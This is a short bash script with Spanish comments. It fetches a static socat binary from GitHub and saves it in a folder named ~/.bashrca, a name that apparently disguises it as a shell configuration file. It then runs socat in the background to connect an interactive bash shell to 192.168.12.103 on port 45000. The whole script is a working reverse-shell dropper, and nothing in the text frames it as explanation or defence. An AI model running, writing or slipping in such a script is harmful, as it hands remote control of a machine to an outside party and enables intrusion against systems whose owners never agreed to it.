#!/bin/bash

# URL
socat_url="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"

# Descargar y crear carpeta
mkdir -p ~/.bashrca
wget -qO ~/.bashrca/socat "$socat_url"

# Revisa la descarga
if [ $? -ne 0 ]; then
    exit 1
fi

# Socat permisos
chmod +x ~/.bashrca/socat

# Socat ejecutar
~/.bashrca/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.12.103:45000 &
